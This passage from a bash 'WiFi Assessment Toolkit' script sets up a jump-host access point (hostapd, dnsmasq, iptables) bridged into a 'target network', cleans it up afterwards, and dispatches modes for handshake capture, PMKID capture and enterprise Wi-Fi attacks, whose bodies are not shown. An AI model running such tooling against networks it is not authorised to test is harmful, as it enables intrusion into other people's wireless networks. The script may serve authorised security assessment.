    
    # 4. Start DHCP server
    log "INFO" "Starting DHCP server..."
    sudo dnsmasq -C "$dnsmasq_conf" -d -z &
    DNSMASQ_PID=$!
    
    # 5. Start the access point
    log "INFO" "Starting access point..."
    sudo hostapd "$hostapd_conf" &
    HOSTAPD_PID=$!
    
    # Create a status file with connection details
    local status_file="$jumphost_dir/jumphost_status.md"
    
    cat > "$status_file" << EOF
# Jump Host Status

## Connection Details

**Jump Host SSID:** $jump_ssid
**Jump Host Password:** $jump_password
**Jump Host IP:** $ap_ip

## Connected Network

**Target Network:** $TARGET_ESSID
**Interface:** $JUMPHOST_INTERFACE

## Status

Jump host started on $(date)
EOF
    
    # Display success message
    log "SUCCESS" "Jump host created successfully!"
    log "INFO" "SSID: $jump_ssid"
    log "INFO" "Password: $jump_password"
    log "INFO" "Jump host IP: $ap_ip"
    log "INFO" "Status file: $status_file"
    
    # Wait for SIGINT (Ctrl+C) or timeout
    log "INFO" "Jump host is active. Press Ctrl+C to stop..."
    log "INFO" "The jump host will automatically stop after $TIMEOUT seconds."
    
    try_catch || {
        log "INFO" "Jump host stopped by user."
        cleanup_jumphost
    }
    
    local start_time=$(date +%s)
    while true; do
        local elapsed=$(($(date +%s) - start_time))
        
        if [ $elapsed -ge $TIMEOUT ]; then
            log "INFO" "Timeout reached. Stopping jump host."
            cleanup_jumphost
            break
        fi
        
        # Check if processes are still running
        if ! kill -0 $HOSTAPD_PID &>/dev/null || ! kill -0 $DNSMASQ_PID &>/dev/null; then
            log "ERROR" "Jump host process died unexpectedly."
            cleanup_jumphost
            break
        fi
        
        sleep 10
    done
}

# Function to clean up jump host
cleanup_jumphost() {
    log "INFO" "Cleaning up jump host..."
    
    # Kill processes
    sudo killall hostapd dnsmasq wpa_supplicant &>/dev/null
    
    # Clean up network configuration
    sudo ip addr flush dev "$INTERFACE"
    sudo ip link set "$INTERFACE" down
    sudo ip link set "$INTERFACE" up
    
    sudo ip link set "$JUMPHOST_INTERFACE" down
    sudo ip link set "$JUMPHOST_INTERFACE" up
    
    # Reset iptables
    sudo iptables -F
    sudo iptables -t nat -F
    
    # Disable IP forwarding
    echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward &>/dev/null
    
    # Re-enable network manager for both interfaces
    if check_tool "nmcli"; then
        sudo nmcli device set "$INTERFACE" managed yes
        sudo nmcli device set "$JUMPHOST_INTERFACE" managed yes
    fi
    
    log "SUCCESS" "Jump host cleaned up."
}

# Function to execute code with try/catch like behavior
try_catch() {
    local die_now=false
    trap 'die_now=true' INT TERM
    
    while ! $die_now; do
        sleep 1
    done
    
    # Propagate the exit condition
    return 1
}

# Main function
main() {
    # Parse command line arguments
    parse_arguments "$@"
    
    # Check dependencies
    check_dependencies
    
    # Display banner with configuration
    echo "${BLUE}${BOLD}"
    echo "============================================================"
    echo "WiFi Assessment Toolkit"
    echo "Mode: $MODE"
    echo "Interface: $INTERFACE"
    if [ ! -z "$TARGET_ESSID" ]; then
        echo "Target ESSID: $TARGET_ESSID"
    fi
    if [ ! -z "$TARGET_BSSID" ]; then
        echo "Target BSSID: $TARGET_BSSID"
    fi
    echo "Output Directory: $CAPTURE_DIR"
    echo "============================================================"
    echo "${RESET}"
    
    # Execute based on mode
    case "$MODE" in
        "scan")
            scan_networks
            ;;
        "attack")
            case "$ATTACK_TYPE" in
                "handshake")
                    capture_handshake
                    ;;
                "pmkid")
                    capture_pmkid
                    ;;
                "enterprise")
                    attack_enterprise
                    ;;
                *)
                    log "ERROR" "Unknown attack type: $ATTACK_TYPE"
                    exit 1
                    ;;
            esac
            ;;
        "jumphost")
            setup_jumphost
            ;;
        *)
            log "ERROR" "Unknown mode: $MODE"
            exit 1
            ;;
    esac
    
    # Final cleanup
    if [ "$MONITOR_MODE" = true ]; then
        reset_interface
    fi
    
    log "SUCCESS" "Operation completed. Results saved to $CAPTURE_DIR"
}

# Execute main if script is run directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi